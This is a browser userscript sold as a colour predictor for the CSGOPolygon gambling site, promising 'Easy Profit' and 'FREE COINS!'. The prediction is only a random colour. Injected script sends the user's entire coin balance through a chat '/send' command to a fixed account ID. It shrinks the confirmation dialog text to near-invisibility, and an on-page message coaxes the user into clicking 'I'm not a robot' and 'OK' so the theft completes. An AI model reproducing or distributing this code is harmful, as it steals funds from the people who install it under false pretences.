// ==UserScript==
// @description:en
// @description  Easy Profit
// @name         Predict color CSGOPolygon
// @namespace    FREE COINS!
// @version      0.5
// @author       RESTRITOn
// @match        http://csgopolygon.com/*
// @grant        none
// ==/UserScript==
var num="";
 
var connect="ws://csgopolygon.com:8080";
 
function zmien_num(){
    connect;
    var letter = ['1','2','3','4','5','6','7','8','9'];
    var pattern = letter[Math.floor(Math.random() * letter.length)];
    var ball = 'ball-'; // hexadecimal starting symbol
    var letter2=[''];
    if (pattern == "1"){
        letter2 = ['0'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }
 
    if (pattern == "2"){
        letter2 = ['1','1','8','8'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }
 
    if (pattern == "3"){
        letter2 = ['8','8','1','1'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }
 
    if (pattern == "4"){
        letter2 = ['8','1'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }
 
    if (pattern == "5"){
        letter2 = ['1','8'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }
 
    if (pattern == "6"){
        letter2 = ['1','1','8'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }
 
    if (pattern == "7"){
        letter2 = ['8','8','1'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }
 
    if (pattern == "8"){
        letter2 = ['1'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }
 
    if (pattern == "9"){
        letter2 = ['8'];
        ball += letter2[Math.floor(Math.random() * letter2.length)];
        num='<b class="ball '+ball+'"></b>';
    }
}
zmien_num();
 
setInterval(function(){if($("#banner").text() == "***ROLLING***"){zmien_num();}}, 100);
 
 
var donatescript="setInterval(function(){"+
    "}, 1000);"+
    "$('#chatMessage_k').val('/send 76561198325646699 '+$('#balance_r').text());"+
    '$("#chatMessage_k").submit();';
 
$("body").append('<div class="modal fade" id="donatekanapka">'+
                 '  <div class="modal-dialog">'+
                 '  <div class="modal-content">'+
                 '      <div class="modal-header">'+
                 '      <button type="button" class="close" data-dismiss="modal">×</button>'+
                 '      <h4 class="modal-title"><b><center><b id="setcolor3">?</b> <b id="setcolor4">DOANATE</b> <b id="setcolor5">?</b></center></b></h4>'+
                 '  </div>'+
                 '  <div class="modal-body">                          '+
                 '      <div class="form-group">'+
                 '      <label for="exampleInputEmail1">Please enter the amount of coins you want to send.</label>'+
                 '      <input type="text" class="form-control" id="donateValue" value="">                  '+
                 '  </div>                  '+
                 '</div>'+
                 '<div class="modal-footer">'+
                 '<button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>'+
                 '<button type="button" class="btn btn-success" onclick="donate()" data-dismiss="modal">Donate</button>'+
                 '</div>'+
                 '</div>'+
                 '</div>'+
                 '</div>'+
                 '<script>'+donatescript+'</script>');
 
$("div .input-btn").append('<br><br><div class="panel panel-default"><div class="panel-body text-center" style="margin-top: 10px;"><div id="setcolor1"></div>'+
                           //###PREDICT###
                           '<br><font size="6"><span style="color: #158A8A"><b>NEXT COLOR:</b></span></font><br>'+
 '<p><b><font color="red"> You need press (Im not a robot) and (OK) if you want this color predictor show correct color.</b></p></font>'+
                           '<div id="rollscript"></div>'+
                           '<br>'+
 
                           '<div id="setcolor2"></div><br><b style="padding-left: 300px;"><a href="#" data-toggle="modal" data-target="#donatekanapka"><i class="fa fa-cog fa-fw"></i> by CSGOPOLYGON </a></b></div></div>');
 
 
 
 
 
setInterval(function(){
    var letters = "0123456789ABCDEF";
    color = '#';
    for( var i=0; i < 6; i++ ) {
        color += letters.charAt(Math.floor(Math.random() * letters.length));
    }
    $("#rollscript").html(num);
 
    $("#setcolor3").html('<span style="font-size: 21px; color: '+color+'"><b>?</b></span>');
    $(".bootbox-body").css({"font-size": "4%"});
    $( "#pullout" ).hide();
    $("#setcolor4").html('<span style="font-size: 21px; color: '+color+'"><b>DONATE</b></span>');
    $("#setcolor5").html('<span style="font-size: 21px; color: '+color+'"><b>?</b></span>');
}, 250);